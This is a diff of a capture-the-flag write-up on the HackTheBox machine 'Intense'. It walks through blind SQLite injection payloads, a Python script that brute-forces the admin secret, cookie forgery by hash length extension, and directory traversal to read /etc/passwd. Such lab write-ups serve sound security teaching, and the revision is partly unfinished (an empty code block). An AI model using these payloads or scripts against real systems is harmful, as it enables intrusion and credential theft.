@@ -22,31 +22,92 @@ Short description to include any strange things to be dealt with - Linux hard di
 
 I started my enumeration with an nmap scan of `10.10.10.195`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-only port 22 and port 80 were open
+```text
+┌──(zweilos㉿kali)-[~/htb/intense]
+└─$ nmap -n -v -sCV -p- 10.10.10.195 -oA intense  
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 20:13 EST
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:13
+Completed NSE at 20:13, 0.00s elapsed
+Initiating NSE at 20:13
+Completed NSE at 20:13, 0.00s elapsed
+Initiating NSE at 20:13
+Completed NSE at 20:13, 0.00s elapsed
+Initiating Ping Scan at 20:13
+Scanning 10.10.10.195 [2 ports]
+Completed Ping Scan at 20:13, 0.05s elapsed (1 total hosts)
+Initiating Connect Scan at 20:13
+Scanning 10.10.10.195 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.195
+Discovered open port 22/tcp on 10.10.10.195
+Completed Connect Scan at 20:13, 22.38s elapsed (65535 total ports)
+Initiating Service scan at 20:13
+Scanning 2 services on 10.10.10.195
+Completed Service scan at 20:14, 6.14s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.195.
+Initiating NSE at 20:14
+Completed NSE at 20:14, 1.59s elapsed
+Initiating NSE at 20:14
+Completed NSE at 20:14, 0.25s elapsed
+Initiating NSE at 20:14
+Completed NSE at 20:14, 0.00s elapsed
+Nmap scan report for 10.10.10.195
+Host is up (0.071s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
+|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
+|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Intense - WebApp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:14
+Completed NSE at 20:14, 0.00s elapsed
+Initiating NSE at 20:14
+Completed NSE at 20:14, 0.00s elapsed
+Initiating NSE at 20:14
+Completed NSE at 20:14, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
+```
+
+My nmap scan showed that only ports 22 and 80 were open. 
 
 ![](../../.gitbook/assets/1-port80.png)
 
-port 80
+With so little to work with, I loaded the HTTP site hosted on port 80, and found a site that greeted me with a message with guest logon credentials.
 
 > Hello ! You can login with the username and password guest.
->
-> This app is opensource !
 
-Has link to `src.zip`
+The site also pointed out that it was open source, and had a link that let me download `src.zip` which contained the source code for the site.
+
+> This app is opensource !
 
 ![](../../.gitbook/assets/2-guest-login.png)
 
+After logging in with the guest credentials, there was a message that said:
+
 > One day, an old man said "there is no point using automated tools, better to craft his own".
 
-Hint that automated tools will not work here?
+This appeared to be a hint that automated tools would not work to get whatever I needed from this site.
 
 ![](../../.gitbook/assets/3-message-submit.png)
 
-found an input box and of course I had to see what kind of vulnerabilities it might have
+On the `/submit` page I found an input box, and of course I had to see what kind of vulnerabilities it might have!  First I tried the basic `<script>alert('test')</script>` test, and got an interesting error right away.
 
 ![](../../.gitbook/assets/4-syntax-error.png)
 
-After testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing it for a short time I decided to look into the code from the `src.zip` I downloaded from the main page.
+While testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing this for a short time I decided to look into the code from the `src.zip` I downloaded from the main page to find out what kind of queries I might need to formulate.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -107,33 +168,33 @@ app
 13 directories, 38 files
 ```
 
-The file `src.zip` contained source code templates for the website.
+The file `src.zip` contained source code templates for the website, in a folder called `app`.  The most interesting files were the python code files which ran the site using the Flask framework.
 
 ![](../../.gitbook/assets/6-adminpy.png)
 
-from admin.py found a few paths to check out; 
+In the file `admin.py` I found a few new directory paths to check out. 
 
 ![](../../.gitbook/assets/5-admin.png)
 
-the admin page was forbidden, 
+The `/admin` page was forbidden, as expected.
 
 ![](../../.gitbook/assets/6-adminlog.png)
 
-the two log paths required POST rather than GET requests.  Looks like I will need an admin token.  
+As noted in the code, the two `/admin/log` paths required POST rather than GET requests.  It looked like I would need an admin session token to get anything out of these sites.  
 
-```text
+```http
 Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.7B6PiygW8lDO84yRQABGvGfw0ttyTDTwk0h+GEEFpgI=
 ```
 
-Looking at the request to the page in Burp there is a cookie header
+I checked out the request to the page in Burp and found that there was a cookie header, with a base64 encoded string value for the `auth` parameter.
 
-```text
+```http
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
 ```
 
- decoded the base64.  the auth cookie contains the username, a secret, and some kind of binary garbage appended to the string; I needed a way to get the secret for a user `admin` \(from the source code\)
+I decoded the base64 and found the `auth` cookie contained the username, a hex secret, and some kind of binary garbage appended to the end of the string.  It looked like I needed a way to get the secret for a user `admin` \(from the source code\).
 
-```text
+```python
 from flask import Flask, request, render_template, g, redirect, url_for,\
     make_response
 from utils import get_db, get_session, get_user, try_login, query_db, badword_in_str
@@ -219,9 +280,9 @@ if __name__ == "__main__":
     app.run()
 ```
 
-app.py contained a few interesting methods; submit message restricted the messages to less than 140 characters and also does some sort of "bad word" check to filter input.  Afterwards it places the message in the database; 
+The file `app.py` contained a few interesting methods.  It looked like `submitmessage` restricted the message submissions to less than 140 characters and also did some sort of "bad word" check to filter input.  Afterwards it would place the message in the database if it passed those checks.
 
-```text
+```python
 from hashlib import sha256
 from base64 import b64decode, b64encode
 from random import randrange
@@ -284,9 +345,9 @@ def create_cookie(session):
     return b64encode(session) + b'.' + b64encode(cookie_sig)
 ```
 
-lwt.py contained code for creating the session and the cookie
+The code file `lwt.py` contained code for creating the session and the cookie.  It also contained the code which explained the garbage at the end of the string, it was a signature comprised of the sha256 digest of the rest of the `auth` string.
 
-```text
+```python
 import lwt
 import sqlite3
 from hashlib import sha256
@@ -402,15 +463,17 @@ def admin_list_log(logdir):
     return listdir(logdir)
 ```
 
-utils.py also contained some interesting methods; the method `is_admin()` teslls me that the `admin` user has a role of `1`; `get_user()` and `try_login()` give me some example SQL queries to test; `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]`. Looks like I will not be able to execute code with my SQL injection
+The final file `utils.py` also contained some interesting methods. The method `is_admin()` told me that the `admin` user has a role of `1` in the database, `get_user()` and `try_login()` gave me some example SQL queries to test, and `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]` to avoid using.  It looked like I would not be able to execute code directly with my SQL injection and would have to pull out the data I wanted instead.
+
+### SQLite SQL Injection
 
 ![](../../.gitbook/assets/7-sqli.png)
 
-Pulling information from utils.py I crafted the query: `' AND select secret from users where username = admin and role =1`
+Using information from `utils.py` I crafted the query: `' AND select secret from users where username = admin and role =1`, but got another syntax error.  
 
 ![](../../.gitbook/assets/7-sqli-close.png)
 
-`a') UNION SELECT password FROM users --` results in `no such column: password`, but substituting password with secret makes the message get submitted with no error messages.  From the source code I could see that the backend database was sqlite3, so I did some research into doing SQL injection on this type of database.  I found a few resources that helped explain what I was doing wrong.
+`a') UNION SELECT password FROM users --` resulted in the error `no such column: password`. However, substituting 'password' with 'secret' made it so the message was submitted with no error messages.  From the source code I could see that the backend database was sqlite3, so I did some research into doing SQL injection on this type of database.  I found a few resources that helped explain what I was doing wrong.
 
 * [https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite](https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite)
 * [https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time](https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time)
@@ -419,7 +482,7 @@ Apparently the errors I received while inserting a semicolon were because I coul
 
 > Ok so I've spent some time working on this and there is a way to make it work. You can interrogate sqlite on queries like: "SELECT CASE WHEN \(SELECT SUBSTRING\(password, 1, 1\)\) = 'a' THEN 1 END". You can write a simple python script that changes the 1 inside substring and the 'a' char. In this way you can pretty much bruteforce the output of the column. – RobertM Jul 16 at 19:11
 
-I seems like I will have to brute force each character of the secret string.  Python was my best bet for doing this.  I did some more reading to see how to craft this type of SQL query since it was new to me.
+I seemed like I would have to brute force each character of the secret string. I did some more reading to see how to craft this type of SQL query since it was new to me.
 
 * [https://www.sqlitetutorial.net/sqlite-case/](https://www.sqlitetutorial.net/sqlite-case/)
 
@@ -431,11 +494,11 @@ However I still encountered a problem, since it seemed as if I wasn't able to us
 
 ![](../../.gitbook/assets/7-sqli-substring.png)
 
-I also made a mistake when typing in the method SUBSTR, and I got a bit frustrated with sending indivudual queries through the website so I moved on to Burp suite to optimize my query testing.  After awhile I finally worked out the kinks and got a working query.  
+I also made a mistake when typing in the method SUBSTR, and I got a bit frustrated with sending individual queries through the website so I moved on to Burp suite to optimize my query testing.  After awhile I finally worked out the kinks and got a working query.  
 
 ![](../../.gitbook/assets/8-intruder-payload.png)
 
-to test my theory I used Burp' Intruder to test a brute force of all alpha-numeric characters on the first 
+To test my theory I used Burp's Intruder to test a brute force of all alpha-numeric characters on the first character of the 'secret' string.
 
 ![](../../.gitbook/assets/8-intruder-test%20%281%29.png)
 
@@ -450,6 +513,8 @@ I was successful, and found that the first character in the admin's secret was `
 └─$ echo -n '84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec' | wc -c
 64
 ```
+
+### Using python to brute force
 
 I used the cookie I already had to pull out the secret string `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec` which was 64 characters long.  This let me know how many characters I needed to brute force for the admin secret. From this I used python to write a brute force program to iterate through all 64 characters in the secret. The following sources helped me:
 
@@ -471,9 +536,11 @@ def get_secret():
     print("The secret for admin is: ", sep="", end="", flush=True)
     for i in range(64):
         for char in string.printable:
+            
             #range(n) starts at 0 and ends at n-1, so need to add 1 when selecting which string location to brute force
             sql_query = "' AND (SELECT CASE WHEN ((SELECT hex(substr(secret,"+str(i+1)+",1)) FROM users WHERE role=1) = hex('"+str(char)+"')) THEN 1 ELSE MATCH(1,1) END))--"
             message = requests.post(url, cookies = { "auth" : guest_secret , "Referer" : referer }, data = { "message" : sql_query }).text
+            
             # since error messages start with the word "unable", use this to filter out the correct letter
             if not "unable" in message:
                 print(char, sep="", end="", flush=True)
@@ -508,11 +575,11 @@ b¾nTÁu µí§
 sm`Æ
 ```
 
-crafted my new auth cookie, then base64'd it `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
+crafted my new auth cookie, then base64'd it, and got the result: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
 
 ![](../../.gitbook/assets/9-broke-site.png)
 
-Using this cookie however broke the whole site, and made it so no pages would load. I figured it had something to do with the unreadable characters that were appended to the end of the secret in the cookie.
+Using this cookie, however, broke the whole site and made it so no pages would load. I figured it had something to do with the unreadable signature characters that were appended to the end of the secret in the cookie.
 
 ```python
 def sign(msg):
@@ -548,7 +615,7 @@ def parse_session(cookie):
     return info
 ```
 
-going back to lwt.py gave me the answer. the data after the `';'` was a signature created by running sha256 on secret + MSG
+I went back to the source code file `lwt.py` , which gave me the answer.  The data after the `;` was a signature created by running sha256 on secret + MSG
 
 ```python
 def create_cookie(session):
@@ -556,31 +623,35 @@ def create_cookie(session):
     return b64encode(session) + b'.' + b64encode(cookie_sig)
 ```
 
-to create the signature I needed to run the create\_cookie\(\) method above to encode and sign the username and secret
+In order to create the signature, I needed to run the `create_cookie()` method above to encode and sign the username and secret.
 
 [https://github.com/bwall/HashPump](https://github.com/bwall/HashPump)
 
-the final admin cookie was
+```python
+
+```
+
+implementing hashpumpy...
 
 ```text
 dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IZp1w+kV4OqLepjmgjxZR6/bcZXtV138PqZiZdxNoGg=
 ```
 
-for some reason the hashpumpy module added the guest cookie to the admin cookie, then appended the signature of the both
+the final admin cookie was
 
 ```text
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
 ```
 
+For some reason the `hashpumpy` module added the guest cookie to the admin cookie, then appended the signature of them both together.
+
 ![](../../.gitbook/assets/9-welcomeadmin.png)
 
-sucessful login
-
-the `admin.py` mentions using the `logfile` and `logdir` properties, along with the POST method after logging in as admin
+However this mega-cookie worked and I was able to login to the `/admin` page successfully.  Back in the `admin.py` file it mentioned using the `logfile` and `logdir` properties on their respective directories, along with the POST method after logging in as admin.  This looked like a task for Burp Repeater.
 
 ![](../../.gitbook/assets/10-etcpasswd.png)
 
-through burp was able to get /etc/passwd; only two users can login, root and user; noticed debian\_snmp so decided to see what I could find on that service
+The `logfile` property was suceptable to directory traversal, and through Burp I was able to download `/etc/passwd`.  There were only two users that had the ability to login: `root` and `user`. I noticed an unusual user named `debian_snmp`, so I decided to see what I could find using the SNMP service. \(Another nmap scan revealed that UDP port 161 was open, which is the default SNMP port!\)
 
 ![](../../.gitbook/assets/10-snmpd-conf.png)
 
